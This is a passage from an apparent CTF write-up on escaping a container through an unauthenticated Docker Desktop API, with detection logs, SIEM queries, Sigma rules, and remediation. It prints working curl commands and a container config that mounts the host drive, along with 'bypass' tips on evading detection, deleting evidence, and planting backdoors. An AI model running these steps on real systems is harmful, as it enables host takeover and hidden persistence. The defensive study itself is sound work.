1. The subnet scan generating 254 connection attempts is noisy: replace with targeted attempts against `192.168.65.1` (gateway), `.2` (typical first host), and the address resolved for `host.docker.internal` rather than sweeping the full range.
2. A single well-targeted `curl http://host.docker.internal:2375/version` attempt would have confirmed the API without any scanning noise: the DNS name resolves directly to the Docker host.

**Remediation:**
1. Never expose the Docker daemon API on an unencrypted TCP socket without authentication: configure TLS mutual authentication for remote API access or use the Unix socket only.
2. Set `"hosts": ["unix:///var/run/docker.sock"]` in Docker daemon configuration to disable TCP API exposure entirely.
3. Implement network segmentation preventing containers from reaching the Docker Desktop bridge network directly.
4. This is CVE-2025-9074 for Docker Desktop: update to a patched version.

**OpSec Rating:** Moderate: the subnet scan generates a recognisable connection volume pattern. The API calls themselves are unprotected HTTP with no authentication requirement, making them invisible in any access control log.

---

### Container Escape: Host Filesystem Mount via Unauthenticated Docker API : MITRE: T1611: Escape to Host · T1552: Unsecured Credentials

With unauthenticated access to the Docker daemon API, an attacker can create a new container with arbitrary configuration: including mounting the Windows host's `C:\` drive into the container filesystem. Docker Desktop on Windows maps the host filesystem as `/mnt/host/c` inside the WSL2 environment. Mounting this path into a new container gives the container process read/write access to the entire Windows host filesystem with the permissions of the Docker daemon: which runs as SYSTEM on Windows. Reading `/mnt/host_root/Users/Administrator/Desktop/root.txt` retrieves the root flag from the Windows host's Administrator desktop.

The exploitation sequence uses only the Docker HTTP API: no Docker client binary is required inside the container:

```
cat > /tmp/container.json << 'EOF'
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
  "HostConfig": {"Binds": ["/mnt/host/c:/mnt/host_root"]},
  "Tty": true,
  "OpenStdin": true
}
EOF
```

```
curl -X POST -H "Content-Type: application/json" -d @/tmp/container.json http://192.168.65.7:2375/containers/create?name=pwned
```

```
{"Id":"bb09e1daa2d14b17f47a56beb444e53fb64839f95d9b6a00c7817a77875cd915","Warnings":[]}
```

```
curl -X POST http://192.168.65.7:2375/containers/bb09e1daa2d1/start
curl http://192.168.65.7:2375/containers/bb09e1daa2d1/logs?stdout=true
```

```
66a854b629b0fd5064ca908839e270a4
```

**Logs Generated:**
1. Docker daemon logs on the Windows host record all API calls: container creation, start, and log retrieval: with timestamps, container IDs, and image names. Location: `%LOCALAPPDATA%\Docker\log\vm\dockerd.log` and Docker Desktop event log.
2. Windows Security Event Log: Event ID 4688 (Process Creation) may record processes spawned by Docker-initiated containers depending on audit policy configuration.
3. Windows Event Log: Docker Desktop generates events in the Application log for container lifecycle events.
4. File access to `C:\Users\Administrator\Desktop\root.txt` by the Docker SYSTEM process: Windows Security Audit Object Access (Event ID 4663) if file system auditing is enabled on the Administrator's desktop.
5. New container `pwned` created with host filesystem mount: visible in `docker ps -a` output on the host and in Docker daemon logs.

**Alerts Triggered:**
1. A container created with a host filesystem mount binding `C:\` is a critical container escape indicator: any Docker security monitoring tool (Falco, Aqua Security, Docker Desktop security policies) would alert on this configuration.
2. Windows Security Event ID 4663 fires on file access to `Administrator\Desktop\root.txt` if object access auditing is enabled on that path.
3. No alert in a default Docker Desktop installation without additional security tooling.

**Network Artifacts:**
1. HTTP POST to `192.168.65.7:2375/containers/create` with the container configuration JSON: visible in network capture.
2. HTTP POST to `.../containers/bb09e1daa2d1/start`.
3. HTTP GET to `.../containers/bb09e1daa2d1/logs?stdout=true` returning the flag.
4. All traffic is cleartext HTTP: full request and response visible to any network observer.

**Artifacts Left:**
1. Container `pwned` (ID `bb09e1daa2d1`) created and run on the Docker host: persists in `docker ps -a` until explicitly removed.
2. Docker daemon logs record the container lifecycle permanently.
3. `/tmp/container.json` on the compromised container filesystem.
4. Windows Event Log entries for container activity if Docker Desktop event logging is configured.
5. File access auditing entry for `root.txt` if Windows object access auditing is enabled on the Administrator desktop.

**Sysmon / EDR (Windows):**
1. Sysmon Event ID 11 (FileCreate) or Security Event ID 4663 would record file access to `C:\Users\Administrator\Desktop\root.txt` by the Docker SYSTEM process if object access auditing is configured.
2. Windows Defender with container security capabilities would alert on a container created with a full host filesystem bind mount: this is a known container escape pattern.
3. Sysmon Event ID 3 (Network Connection) for the Docker API HTTP calls from within WSL2, depending on WSL2 network interface monitoring configuration.

**SIEM Correlation (Windows):**
```
index=windows source="WinEventLog:Security" EventCode=4663 ObjectName="*Administrator*Desktop*" | stats count by SubjectUserName, ObjectName
```
```
index=windows sourcetype=docker_events | search "HostConfig" AND "Binds" AND "/mnt/host" | stats count by container_id, image
```

**Sigma Rule:**
1. [lnx_container_escape_docker_mount.yml](https://github.com/SigmaHQ/sigma/search?q=docker+escape+mount): detects container creation with sensitive host path bind mounts.
2. [win_security_sensitive_file_access.yml](https://github.com/SigmaHQ/sigma/search?q=sensitive+file+access+windows): detects access to sensitive files on the Windows host filesystem including user desktop paths.

**Bypass:**
1. Name the container something operationally neutral rather than `pwned`: use a name consistent with existing containers on the host (`mariadb-backup`, `nginx-worker`) to blend into the expected container inventory.
2. Remove the container immediately after retrieving the flag: `curl -X DELETE http://192.168.65.7:2375/containers/bb09e1daa2d1?force=true`: reduces the persistent artifact window in `docker ps -a` but does not remove daemon log entries.
3. Rather than reading a single file, mount the host filesystem and write an SSH authorized key or create a SYSTEM-level backdoor: achieves persistent access rather than a one-shot flag read, though this generates additional Windows file write events.
4. The Docker daemon log entries are written to the Windows host and are not controllable from inside the container: they persist regardless of cleanup actions taken.

**Remediation:**
1. Disable unauthenticated Docker daemon TCP API access: configure TLS mutual authentication or restrict to Unix socket only.
2. Implement Docker security policies preventing containers from mounting host filesystem paths outside of explicitly approved directories.
3. Enable Windows file system auditing (object access) on sensitive paths: Administrator desktop, `C:\Users\*`, `C:\Windows\System32`.
4. Deploy Falco or a container runtime security tool with rules alerting on containers spawned with host filesystem mounts.
5. Restrict container network access to prevent containers from reaching the Docker Desktop bridge interface.

**OpSec Rating:** Loud: spawning a container with a full host filesystem mount via an unauthenticated Docker API is a well-documented container escape technique with signatures in all major container security monitoring products. The Docker daemon logs on the Windows host record every API call permanently and are not modifiable from the container context.

---

## Flags

| | |
|---|---|
| User | `cat /home/marcus/user.txt` |
| Root | `66a854b629b0fd5064ca908839e270a4` |

---

## Detection Map

| Step | MITRE | Log Source | Sigma Rule | OpSec |
|---|---|---|---|---|
| Port scan | T1046 | Windows Firewall log, network | proc_creation_win_susp_nmap.yml | Loud |
| Web enumeration | T1083 | nginx container access log | web_scan_generic_product.yml | Moderate |
| Subdomain enumeration | T1595.003 | nginx container access log | web_scan_generic_product.yml | Moderate |
| IDOR user data | T1087 / T1552.001 | nginx access log |: | Silent |
| MD5 hash cracking | T1110.002 | Attacker host only | proc_creation_lnx_password_cracker.yml | Silent |
| Cacti auth | T1078 | Cacti user_log DB, nginx log |: | Moderate |
| CVE-2025-24367 RCE | T1190 | nginx log, container EDR, network | proc_creation_lnx_web_shell.yml | Loud |
| Container identification | T1082 / T1016 | Container auditd / EDR | proc_creation_lnx_network_enumeration.yml | Silent |
| Database enumeration | T1005 | Container auditd / EDR | proc_creation_lnx_mysql_credentials_in_cmdline.yml | Silent |
| Docker API discovery | T1046 / T1613 | Docker daemon log, Sysmon EID 3 | lnx_container_escape_docker_api.yml | Moderate |
| Container escape via host mount | T1611 | Docker daemon log, Win Security EID 4663, Sysmon | lnx_container_escape_docker_mount.yml | Loud |

---

## Would I Get Caught

**Assumed environment:** Windows host running Docker Desktop with default configuration. nginx and Cacti running inside Linux containers. No WAF, no Falco, no container runtime security, no Windows object access auditing, no SIEM ingesting Docker daemon logs. Standard nginx access log, Windows Security Event Log with default audit policy, and Docker daemon logs written to the Windows host.

**Verdict:** No. The attack chain executes without a single real-time alert. The IDOR returns all user data in one silent HTTP request. The Cacti RCE generates web shell files and a reverse shell that no default configuration monitors in real time. The Docker API is unauthenticated and generates HTTP access log entries that nothing is reading. The root flag is retrieved from the Windows host filesystem in one curl request.

**The single control that breaks the entire chain:** Authenticating the Docker daemon API. With TLS mutual authentication on the Docker daemon, the container-to-host escape is completely blocked: the API is unreachable without a valid client certificate. Everything before this step (IDOR, hash cracking, Cacti RCE, www-data shell) still executes, but the chain terminates at the container boundary with no path to the Windows host. The Docker API exposure is the highest-severity finding on this machine: it converts a container-level compromise into full Windows host control in three API calls.

**Where a tuned environment catches this operation:**

File integrity monitoring on the Cacti web directory would alert the moment `xmp.php` is written: before it is ever browsed. This is the earliest viable detection point and prevents the reverse shell entirely. If that is bypassed, Falco with the default ruleset would alert on the container creation with a host filesystem bind mount: `A shell was spawned in a container with an attached host path` is a built-in Falco rule. Either control independently terminates the operation at a different stage.

**What remains undetectable regardless of environment:**

The IDOR query is a single well-formed HTTP GET request that generates one access log entry indistinguishable from legitimate API use. MD5 cracking is entirely offline. Manual username derivation (reasoning from full name `Marcus Higgins` to username `marcus`) generates no network event at all until the successful login. Container identification via reading `/proc` and running `ip addr` generates no alert in any default configuration. These quiet phases are invisible: the exposure is entirely at the web shell creation and the Docker API abuse stages.
